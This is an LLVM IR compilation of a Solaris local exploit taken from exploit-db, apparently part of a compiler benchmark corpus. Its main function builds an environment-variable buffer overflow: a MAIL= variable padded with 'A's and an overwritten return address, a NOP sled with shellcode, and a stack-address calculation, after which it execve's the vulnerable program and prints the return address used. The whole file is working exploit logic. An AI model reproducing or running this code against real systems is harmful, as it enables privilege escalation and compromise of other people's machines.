; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_21024.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_21024.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i32 }

@SP = common dso_local global i32 0, align 4
@__const.main.ev1 = private unnamed_addr constant [6 x i8] c"MAIL=\00", align 1
@.str = private unnamed_addr constant [11 x i8] c"DISPLAY=%s\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"DISPLAY\00", align 1
@DISPENV = common dso_local global i32 0, align 4
@pwd = common dso_local global %struct.TYPE_3__* null, align 8
@.str.2 = private unnamed_addr constant [8 x i8] c"HOME=%s\00", align 1
@VULPROG = common dso_local global i8* null, align 8
@.str.3 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@shellcode = common dso_local global i8* null, align 8
@NOP = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [47 x i8] c"Using  return address = 0x%x (shelladdrr - 8)\0A\00", align 1
@.str.5 = private unnamed_addr constant [31 x i8] c"Click Local in your X window\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [7 x i8] c"execle\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [4096 x i8], align 16
  %7 = alloca [128 x i8], align 16
  %8 = alloca [256 x i8], align 16
  %9 = alloca [2048 x i8], align 16
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca [24 x i8*], align 16
  %13 = alloca [24 x i8*], align 16
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca [64 x i8], align 16
  %17 = alloca [64 x i8], align 16
  %18 = alloca i32*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca [6 x i8], align 1
  %21 = alloca i64, align 8
  %22 = alloca i64, align 8
  %23 = alloca i64, align 8
  %24 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %25 = load i32, i32* @SP, align 4
  %26 = sext i32 %25 to i64
  store i64 %26, i64* %11, align 8
  %27 = bitcast [6 x i8]* %20 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %27, i8* align 1 getelementptr inbounds ([6 x i8], [6 x i8]* @__const.main.ev1, i32 0, i32 0), i64 6, i1 false)
  store i64 2048, i64* %24, align 8
  %28 = load i32, i32* %4, align 4
  %29 = icmp sgt i32 %28, 1
  br i1 %29, label %30, label %36

30:                                               ; preds = %2
  %31 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 1
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @snprintf(i8* %31, i32 255, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0), i8* %34)
  br label %49

36:                                               ; preds = %2
  %37 = call i8* @getenv(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0))
  store i8* %37, i8** %19, align 8
  %38 = load i8*, i8** %19, align 8
  %39 = icmp ne i8* %38, null
  br i1 %39, label %40, label %44

40:                                               ; preds = %36
  %41 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %42 = load i8*, i8** %19, align 8
  %43 = call i32 @snprintf(i8* %41, i32 255, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str, i64 0, i64 0), i8* %42)
  br label %48

44:                                               ; preds = %36
  %45 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %46 = load i32, i32* @DISPENV, align 4
  %47 = call i32 @strncpy(i8* %45, i32 %46, i32 255)
  br label %48

48:                                               ; preds = %44, %40
  br label %49

49:                                               ; preds = %48, %30
  %50 = call i64 (...) @getuid()
  %51 = trunc i64 %50 to i32
  %52 = call %struct.TYPE_3__* @getpwuid(i32 %51)
  store %struct.TYPE_3__* %52, %struct.TYPE_3__** @pwd, align 8
  %53 = getelementptr inbounds [128 x i8], [128 x i8]* %7, i64 0, i64 0
  %54 = load %struct.TYPE_3__*, %struct.TYPE_3__** @pwd, align 8
  %55 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 4
  %57 = call i8* @strdup(i32 %56)
  %58 = call i32 @snprintf(i8* %53, i32 127, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0), i8* %57)
  %59 = load i8*, i8** @VULPROG, align 8
  %60 = getelementptr inbounds [24 x i8*], [24 x i8*]* %12, i64 0, i64 0
  store i8* %59, i8** %60, align 16
  %61 = getelementptr inbounds [24 x i8*], [24 x i8*]* %12, i64 0, i64 1
  store i8* null, i8** %61, align 8
  %62 = call i8* @getcwd(i8* null, i32 256)
  store i8* %62, i8** %14, align 8
  %63 = load i64, i64* %24, align 8
  %64 = load i8*, i8** %14, align 8
  %65 = call i32 @strlen(i8* %64)
  %66 = call i32 @strlen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  %67 = add nsw i32 %65, %66
  %68 = sext i32 %67 to i64
  %69 = sub nsw i64 %63, %68
  store i64 %69, i64* %24, align 8
  %70 = getelementptr inbounds [6 x i8], [6 x i8]* %20, i64 0, i64 0
  %71 = call i32 @strlen(i8* %70)
  %72 = sext i32 %71 to i64
  store i64 %72, i64* %21, align 8
  %73 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %74 = call i32 @bzero(i8* %73, i32 4096)
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %76 = getelementptr inbounds [6 x i8], [6 x i8]* %20, i64 0, i64 0
  %77 = load i64, i64* %21, align 8
  %78 = trunc i64 %77 to i32
  %79 = call i32 @memcpy(i8* %75, i8* %76, i32 %78)
  %80 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %81 = load i64, i64* %21, align 8
  %82 = getelementptr inbounds i8, i8* %80, i64 %81
  %83 = load i64, i64* %24, align 8
  %84 = call i32 @memset(i8* %82, i8 signext 65, i64 %83)
  %85 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %86 = call i32 @bzero(i8* %85, i32 2048)
  %87 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %88 = bitcast i8* %87 to i32*
  store i32* %88, i32** %18, align 8
  store i64 0, i64* %22, align 8
  br label %89

89:                                               ; preds = %102, %49
  %90 = load i64, i64* %22, align 8
  %91 = load i8*, i8** @shellcode, align 8
  %92 = call i32 @strlen(i8* %91)
  %93 = sext i32 %92 to i64
  %94 = sub i64 2048, %93
  %95 = icmp ult i64 %90, %94
  br i1 %95, label %96, label %105

96:                                               ; preds = %89
  %97 = load i32, i32* @NOP, align 4
  %98 = load i32*, i32** %18, align 8
  %99 = load i64, i64* %22, align 8
  %100 = sdiv i64 %99, 4
  %101 = getelementptr inbounds i32, i32* %98, i64 %100
  store i32 %97, i32* %101, align 4
  br label %102

102:                                              ; preds = %96
  %103 = load i64, i64* %22, align 8
  %104 = add nsw i64 %103, 4
  store i64 %104, i64* %22, align 8
  br label %89

105:                                              ; preds = %89
  %106 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %107 = load i64, i64* %22, align 8
  %108 = getelementptr inbounds i8, i8* %106, i64 %107
  %109 = getelementptr inbounds i8, i8* %108, i64 -4
  %110 = load i8*, i8** @shellcode, align 8
  %111 = load i8*, i8** @shellcode, align 8
  %112 = call i32 @strlen(i8* %111)
  %113 = call i32 @memcpy(i8* %109, i8* %110, i32 %112)
  %114 = getelementptr inbounds [64 x i8], [64 x i8]* %16, i64 0, i64 0
  %115 = getelementptr inbounds [24 x i8*], [24 x i8*]* %13, i64 0, i64 0
  store i8* %114, i8** %115, align 16
  %116 = getelementptr inbounds [2048 x i8], [2048 x i8]* %9, i64 0, i64 0
  %117 = getelementptr inbounds [24 x i8*], [24 x i8*]* %13, i64 0, i64 1
  store i8* %116, i8** %117, align 8
  %118 = getelementptr inbounds [64 x i8], [64 x i8]* %17, i64 0, i64 0
  %119 = getelementptr inbounds [24 x i8*], [24 x i8*]* %13, i64 0, i64 2
  store i8* %118, i8** %119, align 16
  %120 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 0
  %121 = getelementptr inbounds [24 x i8*], [24 x i8*]* %13, i64 0, i64 3
  store i8* %120, i8** %121, align 8
  %122 = getelementptr inbounds [256 x i8], [256 x i8]* %8, i64 0, i64 0
  %123 = getelementptr inbounds [24 x i8*], [24 x i8*]* %13, i64 0, i64 4
  store i8* %122, i8** %123, align 16
  %124 = getelementptr inbounds [128 x i8], [128 x i8]* %7, i64 0, i64 0
  %125 = getelementptr inbounds [24 x i8*], [24 x i8*]* %13, i64 0, i64 5
  store i8* %124, i8** %125, align 8
  %126 = getelementptr inbounds [24 x i8*], [24 x i8*]* %13, i64 0, i64 6
  store i8* null, i8** %126, align 16
  %127 = call i32 (...) @get_sp()
  %128 = ashr i32 %127, 24
  %129 = trunc i32 %128 to i8
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 239
  br i1 %131, label %132, label %136

132:                                              ; preds = %105
  %133 = load i32, i32* @SP, align 4
  %134 = sub nsw i32 %133, 264175616
  %135 = sext i32 %134 to i64
  store i64 %135, i64* %11, align 8
  br label %136

136:                                              ; preds = %132, %105
  %137 = load i64, i64* %11, align 8
  %138 = getelementptr inbounds [24 x i8*], [24 x i8*]* %12, i64 0, i64 0
  %139 = getelementptr inbounds [24 x i8*], [24 x i8*]* %13, i64 0, i64 0
  %140 = call i64 @get_shelladdr(i64 %137, i8** %138, i8** %139, i32 -8)
  store i64 %140, i64* %10, align 8
  %141 = load i64, i64* %10, align 8
  %142 = sub nsw i64 %141, 8
  store i64 %142, i64* %10, align 8
  %143 = load i64, i64* %10, align 8
  %144 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.4, i64 0, i64 0), i64 %143)
  %145 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.5, i64 0, i64 0))
  %146 = bitcast i64* %10 to i8*
  store i8* %146, i8** %15, align 8
  %147 = load i8*, i8** %14, align 8
  %148 = call i32 @strlen(i8* %147)
  %149 = call i32 @strlen(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0))
  %150 = add nsw i32 %148, %149
  %151 = srem i32 %150, 4
  %152 = sub nsw i32 4, %151
  %153 = sext i32 %152 to i64
  store i64 %153, i64* %23, align 8
  store i64 0, i64* %22, align 8
  br label %154

154:                                              ; preds = %172, %136
  %155 = load i64, i64* %22, align 8
  %156 = load i64, i64* %24, align 8
  %157 = load i64, i64* %23, align 8
  %158 = sub nsw i64 %156, %157
  %159 = icmp slt i64 %155, %158
  br i1 %159, label %160, label %175

160:                                              ; preds = %154
  %161 = load i8*, i8** %15, align 8
  %162 = load i64, i64* %22, align 8
  %163 = srem i64 %162, 4
  %164 = getelementptr inbounds i8, i8* %161, i64 %163
  %165 = load i8, i8* %164, align 1
  %166 = load i64, i64* %21, align 8
  %167 = load i64, i64* %23, align 8
  %168 = add nsw i64 %166, %167
  %169 = load i64, i64* %22, align 8
  %170 = add nsw i64 %168, %169
  %171 = getelementptr inbounds [4096 x i8], [4096 x i8]* %6, i64 0, i64 %170
  store i8 %165, i8* %171, align 1
  br label %172

172:                                              ; preds = %160
  %173 = load i64, i64* %22, align 8
  %174 = add nsw i64 %173, 1
  store i64 %174, i64* %22, align 8
  br label %154

175:                                              ; preds = %154
  %176 = load i8*, i8** @VULPROG, align 8
  %177 = getelementptr inbounds [24 x i8*], [24 x i8*]* %12, i64 0, i64 0
  %178 = getelementptr inbounds [24 x i8*], [24 x i8*]* %13, i64 0, i64 0
  %179 = call i32 @execve(i8* %176, i8** %177, i8** %178)
  %180 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  %181 = load i32, i32* %3, align 4
  ret i32 %181
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #2

declare dso_local i8* @getenv(i8*) #2

declare dso_local i32 @strncpy(i8*, i32, i32) #2

declare dso_local %struct.TYPE_3__* @getpwuid(i32) #2

declare dso_local i64 @getuid(...) #2

declare dso_local i8* @strdup(i32) #2

declare dso_local i8* @getcwd(i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @bzero(i8*, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @memset(i8*, i8 signext, i64) #2

declare dso_local i32 @get_sp(...) #2

declare dso_local i64 @get_shelladdr(i64, i8**, i8**, i32) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @execve(i8*, i8**, i8**) #2

declare dso_local i32 @perror(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
